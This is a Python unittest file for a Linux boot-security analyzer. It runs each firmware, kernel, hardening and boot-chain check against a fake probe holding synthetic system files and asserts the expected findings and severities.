"""Every check, driven by a machine that does not exist.

This is the module that makes the Boot Analyzer trustworthy. Each check is a
pure function of a Probe and a Policy, so every one of them can be handed a
machine with Secure Boot off, a world-writable /boot, an unsigned kernel module
and a cron job that pipes curl into sh — none of which this machine has — and
asked what it says.

The pattern throughout:

    probe = FakeProbe(files={...})
    findings = run("check.id", probe)
    assert "some.finding.id" in ids(findings)

`run()` goes through the real registry and the real `run_check`, so a check
that raises is a failure here rather than a silent gap in coverage.
"""

from __future__ import annotations

import unittest

from .support import qt_application  # noqa: F401  - sets sys.path

from clamguard.core.boot.model import Severity  # noqa: E402
from clamguard.core.boot.probe import FakeProbe  # noqa: E402
from clamguard.core.boot.profile import Policy  # noqa: E402
from clamguard.core.boot.registry import catalogue, get, run_check  # noqa: E402

SECURE_BOOT_VAR = ("/sys/firmware/efi/efivars/"
                   "SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c")
SETUP_MODE_VAR = ("/sys/firmware/efi/efivars/"
                  "SetupMode-8be4df61-93ca-11d2-aa0d-00e098032b8c")
DBX_VAR = ("/sys/firmware/efi/efivars/"
           "dbx-d719b2cb-3d3a-4596-a3bc-dad00e67656f")


def run(check_id: str, probe, preset: str = "balanced"):
    """Run one registered check and return its findings."""
    catalogue()                       # make sure everything is registered
    item = get(check_id)
    assert item is not None, f"no such check: {check_id}"
    outcome = run_check(item, probe, Policy.for_preset(preset))
    assert not outcome.error, f"{check_id} raised: {outcome.error}"
    return outcome


def ids(outcome) -> list[str]:
    return [finding.id for finding in outcome.findings]


def only(outcome):
    assert len(outcome.findings) == 1, \
        f"expected one finding, got {ids(outcome)}"
    return outcome.findings[0]


def uefi_raw(secure_boot: int = 0, setup_mode: int = 0) -> dict:
    return {
        SECURE_BOOT_VAR: bytes([6, 0, 0, 0, secure_boot]),
        SETUP_MODE_VAR: bytes([6, 0, 0, 0, setup_mode]),
    }


# ---------------------------------------------------------------------------
# The catalogue itself
# ---------------------------------------------------------------------------


class TestCatalogue(unittest.TestCase):
    def test_every_check_has_the_metadata_the_ui_needs(self) -> None:
        for item in catalogue():
            with self.subTest(check=item.id):
                self.assertTrue(item.title)
                self.assertTrue(item.inspects, "the Checks tab shows this")
                self.assertTrue(item.inspects.endswith("."),
                                "write `inspects` as a sentence")
                self.assertIsNotNone(item.category)

    def test_check_ids_are_unique_and_dotted(self) -> None:
        seen = [item.id for item in catalogue()]
        self.assertEqual(len(seen), len(set(seen)))
        for check_id in seen:
            self.assertIn(".", check_id, f"{check_id} should read as a path")

    def test_every_category_has_at_least_one_check(self) -> None:
        from clamguard.core.boot.model import Category

        covered = {item.category for item in catalogue()}
        self.assertEqual(covered, set(Category))

    def test_a_check_that_crashes_becomes_a_finding_rather_than_an_exception(self) -> None:
        from clamguard.core.boot.model import Category
        from clamguard.core.boot.registry import Check

        def explode(probe, policy):
            raise RuntimeError("boom")
            yield  # pragma: no cover

        broken = Check(id="test.broken", title="Broken", category=Category.KERNEL,
                       inspects="Nothing.", function=explode)
        outcome = run_check(broken, FakeProbe(), Policy.for_preset("balanced"))
        self.assertEqual(outcome.error, "boom")
        self.assertEqual(len(outcome.findings), 1)
        self.assertIs(outcome.findings[0].severity, Severity.INFO)
        self.assertIn("could not complete", outcome.findings[0].title)

    def test_every_finding_id_starts_with_its_check_id(self) -> None:
        """Mutes and severity overrides are keyed on the finding id."""
        probe = FakeProbe(files={"/proc/cmdline": "root=/dev/sda1 quiet"})
        for item in catalogue():
            outcome = run_check(item, probe, Policy.for_preset("balanced"))
            for finding in outcome.findings:
                with self.subTest(check=item.id, finding=finding.id):
                    self.assertTrue(finding.id.startswith(item.id))
                    self.assertEqual(finding.check_id, item.id)

    def test_no_check_crashes_on_a_machine_with_nothing_on_it(self) -> None:
        """The empty probe is the worst case: every file absent, no tools."""
        probe = FakeProbe(binaries=set())
        for item in catalogue():
            with self.subTest(check=item.id):
                outcome = run_check(item, probe, Policy.for_preset("balanced"))
                self.assertEqual(outcome.error, "")

    def test_every_finding_explains_itself(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "mitigations=off nokaslr"})
        for item in catalogue():
            outcome = run_check(item, probe, Policy.for_preset("paranoid"))
            for finding in outcome.findings:
                with self.subTest(finding=finding.id):
                    self.assertTrue(finding.title)
                    self.assertTrue(finding.summary,
                                    "a finding with no summary is just a scary word")

    def test_no_fix_is_ever_marked_as_something_clamguard_will_do(self) -> None:
        """Every fix is a command to copy. Nothing on this page acts."""
        probe = FakeProbe(files={"/proc/cmdline": "mitigations=off"})
        for item in catalogue():
            for finding in run_check(item, probe,
                                     Policy.for_preset("paranoid")).findings:
                for fix in finding.fixes:
                    with self.subTest(finding=finding.id, fix=fix.title):
                        self.assertTrue(fix.command or fix.manual,
                                        "a fix must say how, one way or another")


# ---------------------------------------------------------------------------
# Firmware
# ---------------------------------------------------------------------------


class TestFirmware(unittest.TestCase):
    def test_a_machine_without_uefi_says_so(self) -> None:
        outcome = run("firmware.boot-mode", FakeProbe())
        self.assertIn("firmware.boot-mode.legacy", ids(outcome))

    def test_a_uefi_machine_passes_the_boot_mode_check(self) -> None:
        outcome = run("firmware.boot-mode", FakeProbe(modes={"/sys/firmware/efi": 0o040755}))
        self.assertIs(only(outcome).severity, Severity.PASS)

    def test_secure_boot_is_skipped_without_uefi(self) -> None:
        outcome = run("firmware.secure-boot", FakeProbe())
        self.assertIn("UEFI", outcome.skipped)

    def test_secure_boot_off_is_reported(self) -> None:
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=uefi_raw(0, 0))
        finding = only(run("firmware.secure-boot", probe))
        self.assertEqual(finding.id, "firmware.secure-boot.disabled")
        self.assertEqual(finding.value, "disabled")
        self.assertTrue(finding.impact)

    def test_secure_boot_on_passes(self) -> None:
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=uefi_raw(1, 0))
        self.assertIs(only(run("firmware.secure-boot", probe)).severity, Severity.PASS)

    def test_setup_mode_outranks_secure_boot_being_on(self) -> None:
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=uefi_raw(1, 1))
        finding = only(run("firmware.secure-boot", probe))
        self.assertEqual(finding.id, "firmware.secure-boot.setup-mode")
        self.assertGreaterEqual(finding.severity, Severity.HIGH)

    def test_the_preset_decides_how_bad_secure_boot_being_off_is(self) -> None:
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=uefi_raw(0, 0))
        relaxed = only(run("firmware.secure-boot", probe, "relaxed")).severity
        paranoid = only(run("firmware.secure-boot", FakeProbe(
            modes={"/sys/firmware/efi": 0o040755}, raw=uefi_raw(0, 0)),
            "paranoid")).severity
        self.assertLess(relaxed, paranoid)

    def test_an_unreadable_secure_boot_variable_is_reported_as_unknown(self) -> None:
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, binaries=set())
        finding = only(run("firmware.secure-boot", probe))
        self.assertEqual(finding.id, "firmware.secure-boot.unknown")
        self.assertIs(finding.severity, Severity.INFO)

    def test_the_revocation_list_is_irrelevant_when_secure_boot_is_off(self) -> None:
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=uefi_raw(0, 0))
        self.assertIn("Secure Boot is off", run("firmware.revocation", probe).skipped)

    def test_an_empty_dbx_with_secure_boot_on_is_a_finding(self) -> None:
        raw = uefi_raw(1, 0)
        raw[DBX_VAR] = bytes([6, 0, 0, 0]) + b"\x00" * 8
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=raw)
        self.assertEqual(only(run("firmware.revocation", probe)).id,
                         "firmware.revocation.empty")

    def test_a_populated_dbx_passes(self) -> None:
        raw = uefi_raw(1, 0)
        raw[DBX_VAR] = bytes([6, 0, 0, 0]) + b"\x01" * 4096
        probe = FakeProbe(modes={"/sys/firmware/efi": 0o040755}, raw=raw)
        self.assertIs(only(run("firmware.revocation", probe)).severity, Severity.PASS)

    def test_no_tpm_is_reported(self) -> None:
        finding = only(run("firmware.tpm", FakeProbe()))
        self.assertEqual(finding.id, "firmware.tpm.absent")

    def test_a_tpm_two_that_is_not_measuring_is_a_softer_finding(self) -> None:
        probe = FakeProbe(
            directories={"/sys/class/tpm": ["tpm0"],
                         "/sys/class/tpm/tpm0/pcr-sha256": ["0", "1", "7"]},
            files={"/sys/class/tpm/tpm0/tpm_version_major": "2"},
            commands={("bootctl", "status"): "  TPM2 Support: yes\n  Measured UKI: no\n"},
        )
        finding = only(run("firmware.tpm", probe))
        self.assertEqual(finding.id, "firmware.tpm.not-measured")
        self.assertLess(finding.severity, Severity.MEDIUM)

    def test_a_measured_boot_passes(self) -> None:
        probe = FakeProbe(
            directories={"/sys/class/tpm": ["tpm0"],
                         "/sys/class/tpm/tpm0/pcr-sha256": ["0"]},
            files={"/sys/class/tpm/tpm0/tpm_version_major": "2"},
            commands={("bootctl", "status"):
                      "  TPM2 Support: yes\n  Measured UKI: yes\n  Measured OS: yes\n"},
        )
        self.assertIs(only(run("firmware.tpm", probe)).severity, Severity.PASS)

    def test_a_tpm_one_two_is_called_out(self) -> None:
        probe = FakeProbe(
            directories={"/sys/class/tpm": ["tpm0"]},
            files={"/sys/class/tpm/tpm0/tpm_version_major": "1"},
        )
        self.assertEqual(only(run("firmware.tpm", probe)).id, "firmware.tpm.old")

    def test_a_removable_first_boot_entry_is_flagged(self) -> None:
        probe = FakeProbe(
            modes={"/sys/firmware/efi": 0o040755},
            commands={("efibootmgr", "-v"):
                      "BootCurrent: 0002\nBootOrder: 0001,0002\n"
                      "Boot0001* UEFI: USB Flash Drive\tPciRoot(0x0)\n"
                      "Boot0002* grub\tHD(2,GPT,…)/\\EFI\\grub\\grubx64.efi\n"},
        )
        self.assertIn("firmware.boot-entries.removable-first", ids(run("firmware.boot-entries", probe)))

    def test_a_queued_one_shot_boot_entry_is_reported(self) -> None:
        probe = FakeProbe(
            modes={"/sys/firmware/efi": 0o040755},
            commands={("efibootmgr", "-v"):
                      "BootCurrent: 0002\nBootNext: 0003\nBootOrder: 0002\n"
                      "Boot0002* grub\tHD(2,GPT,…)\n"
                      "Boot0003* Firmware Setup\tFvFile(…)\n"},
        )
        self.assertIn("firmware.boot-entries.bootnext", ids(run("firmware.boot-entries", probe)))

    def test_a_world_writable_esp_is_critical_on_every_preset(self) -> None:
        probe = FakeProbe(
            modes={"/sys/firmware/efi": 0o040755, "/efi": 0o040777},
            files={"/proc/self/mountinfo":
                   "1 2 3:4 / /efi rw - vfat /dev/nvme0n1p2 rw,umask=0000\n"},
        )
        for preset in ("relaxed", "balanced", "strict", "paranoid"):
            with self.subTest(preset=preset):
                finding = only(run("firmware.esp", probe, preset))
                self.assertIs(finding.severity, Severity.CRITICAL)

    def test_a_root_only_esp_passes(self) -> None:
        probe = FakeProbe(
            modes={"/sys/firmware/efi": 0o040755, "/efi": 0o040700},
            files={"/proc/self/mountinfo":
                   "1 2 3:4 / /efi rw - vfat /dev/nvme0n1p2 rw,umask=0077\n"},
        )
        self.assertIs(only(run("firmware.esp", probe)).severity, Severity.PASS)


# ---------------------------------------------------------------------------
# Kernel
# ---------------------------------------------------------------------------


class TestKernelTaint(unittest.TestCase):
    def test_an_untainted_kernel_passes(self) -> None:
        probe = FakeProbe(files={"/proc/sys/kernel/tainted": "0"})
        self.assertIs(only(run("kernel.taint", probe)).severity, Severity.PASS)

    def test_out_of_tree_and_unsigned_modules_are_decoded(self) -> None:
        # 12288 = bit 12 (out-of-tree) + bit 13 (unsigned). This is what an
        # NVIDIA driver produces, and it is the value this machine reports.
        probe = FakeProbe(files={
            "/proc/sys/kernel/tainted": "12288",
            "/proc/modules": "nvidia 1024 0 - Live 0x0 (POE)\next4 512 1 - Live 0x0\n",
        })
        finding = only(run("kernel.taint", probe))
        self.assertEqual(finding.id, "kernel.taint.modules")
        self.assertIn("nvidia", finding.summary)
        self.assertIn("out-of-tree", finding.evidence[0].content)

    def test_an_oops_is_far_more_serious_than_a_third_party_module(self) -> None:
        oops = FakeProbe(files={"/proc/sys/kernel/tainted": "128"})   # bit 7, D
        modules = FakeProbe(files={"/proc/sys/kernel/tainted": "4096"})
        self.assertGreater(only(run("kernel.taint", oops)).severity,
                           only(run("kernel.taint", modules)).severity)

    def test_an_informational_taint_alone_is_only_informational(self) -> None:
        probe = FakeProbe(files={"/proc/sys/kernel/tainted": "512"})  # bit 9, W
        self.assertIs(only(run("kernel.taint", probe)).severity, Severity.INFO)

    def test_an_unreadable_taint_file_skips_rather_than_claiming_clean(self) -> None:
        self.assertTrue(run("kernel.taint", FakeProbe()).skipped)


class TestKernelLockdownAndSigning(unittest.TestCase):
    def test_lockdown_off_is_reported(self) -> None:
        probe = FakeProbe(files={
            "/sys/kernel/security/lockdown": "[none] integrity confidentiality"})
        self.assertEqual(only(run("kernel.lockdown", probe)).id,
                         "kernel.lockdown.none")

    def test_lockdown_on_passes_and_names_the_mode(self) -> None:
        probe = FakeProbe(files={
            "/sys/kernel/security/lockdown": "none [integrity] confidentiality"})
        finding = only(run("kernel.lockdown", probe))
        self.assertIs(finding.severity, Severity.PASS)
        self.assertEqual(finding.value, "integrity")

    def test_lockdown_off_with_secure_boot_on_is_called_unusual(self) -> None:
        probe = FakeProbe(
            files={"/sys/kernel/security/lockdown": "[none] integrity"},
            raw={SECURE_BOOT_VAR: bytes([6, 0, 0, 0, 1])},
        )
        self.assertIn("unusual", only(run("kernel.lockdown", probe)).summary)

    def test_module_signature_enforcement_off_is_reported(self) -> None:
        probe = FakeProbe(files={"/sys/module/module/parameters/sig_enforce": "N",
                                 "/proc/cmdline": "quiet"})
        self.assertEqual(only(run("kernel.module-signing", probe)).id,
                         "kernel.module-signing.not-enforced")

    def test_module_signature_enforcement_on_passes(self) -> None:
        probe = FakeProbe(files={"/sys/module/module/parameters/sig_enforce": "Y",
                                 "/proc/cmdline": "quiet"})
        self.assertIs(only(run("kernel.module-signing", probe)).severity,
                      Severity.PASS)


class TestKernelCommandLine(unittest.TestCase):
    def test_a_clean_command_line_passes(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "BOOT_IMAGE=/vmlinuz root=UUID=x rw quiet"})
        self.assertIs(only(run("kernel.cmdline", probe)).severity, Severity.PASS)

    def test_mitigations_off_is_serious(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "root=UUID=x mitigations=off"})
        finding = only(run("kernel.cmdline", probe))
        self.assertEqual(finding.id, "kernel.cmdline.mitigations")
        self.assertGreaterEqual(finding.severity, Severity.HIGH)

    def test_mitigations_auto_is_not_flagged(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "mitigations=auto"})
        self.assertIs(only(run("kernel.cmdline", probe)).severity, Severity.PASS)

    def test_a_debug_shell_is_treated_as_a_password_free_root_shell(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "root=UUID=x systemd.debug-shell"})
        self.assertGreaterEqual(only(run("kernel.cmdline", probe)).severity,
                                Severity.HIGH)

    def test_single_user_mode_is_detected_from_a_bare_word(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "root=UUID=x single"})
        self.assertIn("kernel.cmdline.emergency", ids(run("kernel.cmdline", probe)))

    def test_several_risky_parameters_produce_several_findings(self) -> None:
        probe = FakeProbe(files={
            "/proc/cmdline": "root=UUID=x nokaslr selinux=0 audit=0"})
        found = ids(run("kernel.cmdline", probe))
        self.assertIn("kernel.cmdline.nokaslr", found)
        self.assertIn("kernel.cmdline.selinux", found)
        self.assertIn("kernel.cmdline.audit", found)

    def test_each_risky_parameter_is_its_own_finding_so_it_can_be_muted(self) -> None:
        probe = FakeProbe(files={"/proc/cmdline": "nokaslr selinux=0"})
        found = ids(run("kernel.cmdline", probe))
        self.assertEqual(len(found), len(set(found)))


class TestCpuMitigations(unittest.TestCase):
    DIR = "/sys/devices/system/cpu/vulnerabilities"

    def test_a_fully_mitigated_cpu_passes(self) -> None:
        probe = FakeProbe(
            directories={self.DIR: ["meltdown", "spectre_v2"]},
            files={f"{self.DIR}/meltdown": "Not affected",
                   f"{self.DIR}/spectre_v2": "Mitigation: Enhanced IBRS"},
        )
        self.assertIs(only(run("kernel.mitigations", probe)).severity, Severity.PASS)

    def test_a_vulnerable_cpu_is_serious(self) -> None:
        probe = FakeProbe(
            directories={self.DIR: ["meltdown", "mds"]},
            files={f"{self.DIR}/meltdown": "Vulnerable",
                   f"{self.DIR}/mds": "Not affected"},
        )
        finding = only(run("kernel.mitigations", probe))
        self.assertEqual(finding.id, "kernel.mitigations.vulnerable")
        self.assertIn("meltdown", finding.value)

    def test_a_partial_mitigation_is_reported_more_gently(self) -> None:
        probe = FakeProbe(
            directories={self.DIR: ["l1tf"]},
            files={f"{self.DIR}/l1tf":
                   "Mitigation: PTE Inversion; VMX: conditional, SMT vulnerable"},
        )
        finding = only(run("kernel.mitigations", probe))
        self.assertEqual(finding.id, "kernel.mitigations.partial")
        self.assertLess(finding.severity, Severity.MEDIUM)

    def test_outdated_microcode_is_taken_from_the_kernels_own_verdict(self) -> None:
        probe = FakeProbe(
            directories={self.DIR: ["old_microcode"]},
            files={f"{self.DIR}/old_microcode": "Vulnerable: Processor vulnerable",
                   "/proc/cpuinfo": "microcode\t: 0x123"},
        )
        finding = only(run("kernel.microcode", probe))
        self.assertEqual(finding.id, "kernel.microcode.outdated")
        self.assertGreaterEqual(finding.severity, Severity.HIGH)


class TestKernelVersionAndIommu(unittest.TestCase):
    def test_a_missing_modules_directory_is_a_pending_reboot_emergency(self) -> None:
        probe = FakeProbe(
            files={"/proc/sys/kernel/osrelease": "6.18.1-arch1",
                   "/proc/stat": "btime 1700000000\n"},
            directories={"/boot": []},
        )
        finding = only(run("kernel.running-version", probe))
        self.assertEqual(finding.id, "kernel.running-version.modules-gone")
        self.assertIs(finding.severity, Severity.HIGH)

    def test_a_kernel_newer_than_the_running_one_means_a_reboot_is_waiting(self) -> None:
        import time

        now = time.time()
        probe = FakeProbe(
            files={"/proc/sys/kernel/osrelease": "6.18.1-arch1",
                   "/proc/stat": f"btime {int(now - 86400)}\n"},
            directories={"/boot": ["vmlinuz-linux"],
                         "/usr/lib/modules/6.18.1-arch1": []},
            modes={"/boot/vmlinuz-linux": 0o100644},
        )
        # The fake's stat has no mtime, so this exercises the "modules present,
        # no newer image" path — the honest outcome for a synthetic machine.
        finding = only(run("kernel.running-version", probe))
        self.assertIn(finding.id, ("kernel.running-version.current",
                                   "kernel.running-version.pending-reboot"))

    def test_an_active_iommu_passes(self) -> None:
        probe = FakeProbe(directories={"/sys/class/iommu": ["ivhd0"]})
        self.assertIs(only(run("kernel.iommu", probe)).severity, Severity.PASS)

    def test_no_iommu_matters_more_with_thunderbolt(self) -> None:
        plain = only(run("kernel.iommu", FakeProbe())).severity
        thunder = only(run("kernel.iommu", FakeProbe(
            directories={"/sys/bus/thunderbolt/devices": ["0-0"]}))).severity
        self.assertGreater(thunder, plain)

    def test_kexec_disabled_passes(self) -> None:
        probe = FakeProbe(files={"/proc/sys/kernel/kexec_load_disabled": "1"})
        self.assertIs(only(run("kernel.kexec", probe)).severity, Severity.PASS)


# ---------------------------------------------------------------------------
# Hardening
# ---------------------------------------------------------------------------


class TestHardening(unittest.TestCase):
    GOOD_SYSCTLS = {
        "/proc/sys/kernel/kptr_restrict": "1",
        "/proc/sys/kernel/dmesg_restrict": "1",
        "/proc/sys/kernel/yama/ptrace_scope": "1",
        "/proc/sys/fs/protected_symlinks": "1",
        "/proc/sys/fs/protected_hardlinks": "1",
        "/proc/sys/fs/protected_regular": "2",
        "/proc/sys/fs/protected_fifos": "1",
        "/proc/sys/kernel/randomize_va_space": "2",
        "/proc/sys/kernel/unprivileged_bpf_disabled": "2",
        "/proc/sys/net/core/bpf_jit_harden": "2",
        "/proc/sys/kernel/perf_event_paranoid": "3",
        "/proc/sys/vm/mmap_min_addr": "65536",
        "/proc/sys/dev/tty/ldisc_autoload": "0",
        "/proc/sys/fs/suid_dumpable": "0",
    }

    def test_a_fully_hardened_machine_passes(self) -> None:
        outcome = run("hardening.sysctl", FakeProbe(files=self.GOOD_SYSCTLS))
        self.assertIs(only(outcome).severity, Severity.PASS)

    def test_each_weak_sysctl_is_its_own_finding(self) -> None:
        files = dict(self.GOOD_SYSCTLS)
        files["/proc/sys/kernel/kptr_restrict"] = "0"
        files["/proc/sys/kernel/dmesg_restrict"] = "0"
        found = ids(run("hardening.sysctl", FakeProbe(files=files)))
        self.assertIn("hardening.sysctl.kernel-kptr_restrict", found)
        self.assertIn("hardening.sysctl.kernel-dmesg_restrict", found)

    def test_a_missing_sysctl_is_not_treated_as_a_failure(self) -> None:
        """A knob this kernel was built without cannot be set, so it is not weak."""
        files = dict(self.GOOD_SYSCTLS)
        del files["/proc/sys/net/core/bpf_jit_harden"]
        outcome = run("hardening.sysctl", FakeProbe(files=files))
        self.assertNotIn("hardening.sysctl.net-core-bpf_jit_harden", ids(outcome))
        finding = only(outcome)
        self.assertIs(finding.severity, Severity.PASS)
        self.assertIn("not present in this kernel", finding.summary)

    def test_absent_knobs_are_listed_when_something_else_is_weak(self) -> None:
        files = dict(self.GOOD_SYSCTLS)
        del files["/proc/sys/net/core/bpf_jit_harden"]
        files["/proc/sys/kernel/kptr_restrict"] = "0"
        found = ids(run("hardening.sysctl", FakeProbe(files=files)))
        self.assertIn("hardening.sysctl.absent", found)

    def test_ge_comparisons_accept_a_stricter_value(self) -> None:
        files = dict(self.GOOD_SYSCTLS)
        files["/proc/sys/kernel/kptr_restrict"] = "2"
        self.assertIs(only(run("hardening.sysctl", FakeProbe(files=files))).severity,
                      Severity.PASS)

    def test_the_preset_scales_how_loudly_weak_sysctls_are_reported(self) -> None:
        files = dict(self.GOOD_SYSCTLS)
        files["/proc/sys/kernel/kptr_restrict"] = "0"
        relaxed = run("hardening.sysctl", FakeProbe(files=files), "relaxed")
        strict = run("hardening.sysctl", FakeProbe(files=files), "strict")
        self.assertLess(relaxed.findings[0].severity, strict.findings[0].severity)

    def test_no_mandatory_access_control_is_reported(self) -> None:
        probe = FakeProbe(files={"/sys/kernel/security/lsm":
                                 "capability,landlock,lockdown,yama,bpf"})
        finding = only(run("hardening.lsm", probe))
        self.assertEqual(finding.id, "hardening.lsm.none")
        self.assertIn("landlock", finding.summary)

    def test_apparmor_passes(self) -> None:
        probe = FakeProbe(files={"/sys/kernel/security/lsm": "capability,apparmor"})
        self.assertIs(only(run("hardening.lsm", probe)).severity, Severity.PASS)

    def test_selinux_in_permissive_mode_is_a_finding_not_a_pass(self) -> None:
        probe = FakeProbe(files={"/sys/kernel/security/lsm": "capability,selinux",
                                 "/sys/fs/selinux/enforce": "0"})
        self.assertEqual(only(run("hardening.lsm", probe)).id,
                         "hardening.lsm.selinux-permissive")

    def test_user_namespaces_are_reported_as_a_trade_off_not_a_mistake(self) -> None:
        probe = FakeProbe(files={"/proc/sys/user/max_user_namespaces": "10000"})
        finding = only(run("hardening.userns", probe))
        self.assertEqual(finding.id, "hardening.userns.allowed")
        self.assertIn("trade-off", finding.impact)

    def test_disabled_user_namespaces_pass(self) -> None:
        probe = FakeProbe(files={"/proc/sys/user/max_user_namespaces": "0"})
        self.assertIs(only(run("hardening.userns", probe)).severity, Severity.PASS)

    def test_suid_dumpable_cores_are_a_finding(self) -> None:
        probe = FakeProbe(files={"/proc/sys/kernel/core_pattern": "core",
                                 "/proc/sys/fs/suid_dumpable": "1"})
        self.assertEqual(only(run("hardening.coredumps", probe)).id,
                         "hardening.coredumps.suid-dumpable")

    def test_a_core_handler_passes(self) -> None:
        probe = FakeProbe(files={
            "/proc/sys/kernel/core_pattern": "|/usr/lib/systemd/systemd-coredump %P",
            "/proc/sys/fs/suid_dumpable": "2"})
        self.assertIs(only(run("hardening.coredumps", probe)).severity, Severity.PASS)


# ---------------------------------------------------------------------------
# Boot chain
# ---------------------------------------------------------------------------


class TestBootChain(unittest.TestCase):
    def test_grub_is_detected_from_its_configuration(self) -> None:
        probe = FakeProbe(files={"/boot/grub/grub.cfg": "menuentry 'Linux' {}"})
        finding = only(run("bootchain.bootloader", probe))
        self.assertIs(finding.severity, Severity.PASS)
        self.assertIn("GRUB", finding.value)

    def test_systemd_boot_is_detected_from_its_entries_directory(self) -> None:
        probe = FakeProbe(directories={"/boot/loader/entries": ["arch.conf"]})
        self.assertIn("systemd-boot", only(run("bootchain.bootloader", probe)).value)

    def test_a_world_writable_file_under_boot_is_critical_everywhere(self) -> None:
        probe = FakeProbe(
            directories={"/boot": ["vmlinuz-linux"]},
            modes={"/boot": 0o040755, "/boot/vmlinuz-linux": 0o100666},
        )
        for preset in ("relaxed", "paranoid"):
            with self.subTest(preset=preset):
                found = run("bootchain.permissions", probe, preset)
                critical = [f for f in found.findings
                            if f.severity is Severity.CRITICAL]
                self.assertTrue(critical)

    def test_a_tidy_boot_directory_passes(self) -> None:
        probe = FakeProbe(
            directories={"/boot": ["vmlinuz-linux"]},
            modes={"/boot": 0o040755, "/boot/vmlinuz-linux": 0o100644},
        )
        self.assertIs(only(run("bootchain.permissions", probe)).severity, Severity.PASS)

    def test_a_grub_without_a_password_is_reported(self) -> None:
        probe = FakeProbe(files={"/boot/grub/grub.cfg": "menuentry 'Linux' {}",
                                 "/etc/default/grub": "GRUB_TIMEOUT=5"})
        self.assertEqual(only(run("bootchain.grub-password", probe)).id,
                         "bootchain.grub-password.unset")

    def test_a_grub_with_a_password_passes(self) -> None:
        probe = FakeProbe(files={
            "/boot/grub/grub.cfg": "set superusers='root'\npassword_pbkdf2 root grub.pbkdf2…"})
        self.assertIs(only(run("bootchain.grub-password", probe)).severity,
                      Severity.PASS)

    def test_an_unreadable_grub_config_says_unknown_rather_than_guessing(self) -> None:
        probe = FakeProbe(denied={"/boot/grub/grub.cfg"},
                          modes={"/boot/grub/grub.cfg": 0o100600})
        finding = only(run("bootchain.grub-password", probe))
        self.assertEqual(finding.id, "bootchain.grub-password.unknown")
        self.assertIs(finding.severity, Severity.INFO)

    def test_a_plain_root_filesystem_is_reported(self) -> None:
        probe = FakeProbe(files={"/proc/self/mountinfo":
                                 "1 2 3:4 / / rw - ext4 /dev/nvme0n1p3 rw\n"})
        found = ids(run("bootchain.encryption", probe))
        self.assertIn("bootchain.encryption.none", found)

    def test_a_luks_root_passes(self) -> None:
        probe = FakeProbe(
            files={"/proc/self/mountinfo":
                   "1 2 3:4 / / rw - ext4 /dev/mapper/root rw\n",
                   "/sys/block/dm-0/dm/name": "root",
                   "/sys/block/dm-0/dm/uuid": "CRYPT-LUKS2-abc-root"},
            directories={"/sys/block": ["dm-0", "nvme0n1"]},
        )
        found = run("bootchain.encryption", probe)
        self.assertIn("bootchain.encryption.root", ids(found))
        self.assertIs(found.findings[0].severity, Severity.PASS)

    def test_plain_swap_beside_an_encrypted_root_is_a_finding(self) -> None:
        probe = FakeProbe(
            files={"/proc/self/mountinfo":
                   "1 2 3:4 / / rw - ext4 /dev/mapper/root rw\n",
                   "/sys/block/dm-0/dm/name": "root",
                   "/sys/block/dm-0/dm/uuid": "CRYPT-LUKS2-abc-root",
                   "/proc/swaps": "Filename\tType\tSize\n/dev/nvme0n1p5\tpartition\t8G\t0\t-2\n"},
            directories={"/sys/block": ["dm-0"]},
        )
        self.assertIn("bootchain.encryption.swap-plain", ids(run("bootchain.encryption", probe)))

    def test_plain_swap_on_a_plain_disk_is_not_reported_twice(self) -> None:
        probe = FakeProbe(files={
            "/proc/self/mountinfo": "1 2 3:4 / / rw - ext4 /dev/sda1 rw\n",
            "/proc/swaps": "Filename\tType\tSize\n/dev/sda2\tpartition\t8G\t0\t-2\n"})
        found = ids(run("bootchain.encryption", probe))
        self.assertNotIn("bootchain.encryption.swap-plain", found)

    def test_missing_mount_options_are_reported(self) -> None:
        probe = FakeProbe(files={"/proc/self/mountinfo":
                                 "1 2 3:4 / /tmp rw,relatime - tmpfs tmpfs rw\n"})
        finding = only(run("bootchain.mount-options", probe))
        self.assertEqual(finding.id, "bootchain.mount-options.weak")
        self.assertIn("nosuid", finding.summary)

    def test_safe_mount_options_pass(self) -> None:
        probe = FakeProbe(files={"/proc/self/mountinfo":
                                 "1 2 3:4 / /tmp rw,nosuid,nodev - tmpfs tmpfs rw\n"})
        self.assertIs(only(run("bootchain.mount-options", probe)).severity,
                      Severity.PASS)

    def test_an_initramfs_is_matched_across_naming_conventions(self) -> None:
        for kernel, image in (("vmlinuz-linux", "initramfs-linux.img"),
                              ("vmlinuz-6.1.0-13-amd64", "initrd.img-6.1.0-13-amd64"),
                              ("vmlinuz-6.5.6-200.fc38", "initramfs-6.5.6-200.fc38.img")):
            with self.subTest(kernel=kernel):
                probe = FakeProbe(directories={"/boot": [kernel, image]},
                                  modes={f"/boot/{kernel}": 0o100644,
                                         f"/boot/{image}": 0o100600})
                self.assertIs(only(run("bootchain.initramfs", probe)).severity,
                              Severity.PASS)

    def test_a_kernel_with_no_initramfs_is_only_informational(self) -> None:
        probe = FakeProbe(directories={"/boot": ["vmlinuz-linux"]},
                          modes={"/boot/vmlinuz-linux": 0o100644})
        finding = only(run("bootchain.initramfs", probe))
        self.assertEqual(finding.id, "bootchain.initramfs.missing")
        self.assertIs(finding.severity, Severity.INFO)

    def test_a_fixed_disk_passes_the_removable_check(self) -> None:
        probe = FakeProbe(
            files={"/proc/self/mountinfo": "1 2 3:4 / / rw - ext4 /dev/sda1 rw\n",
                   "/sys/block/sda/removable": "0"})
        self.assertIs(only(run("bootchain.removable", probe)).severity, Severity.PASS)

    def test_booting_from_removable_media_is_reported(self) -> None:
        probe = FakeProbe(
            files={"/proc/self/mountinfo": "1 2 3:4 / /boot rw - vfat /dev/sdb1 rw\n",
                   "/sys/block/sdb/removable": "1"})
        self.assertEqual(only(run("bootchain.removable", probe)).id,
                         "bootchain.removable.removable")


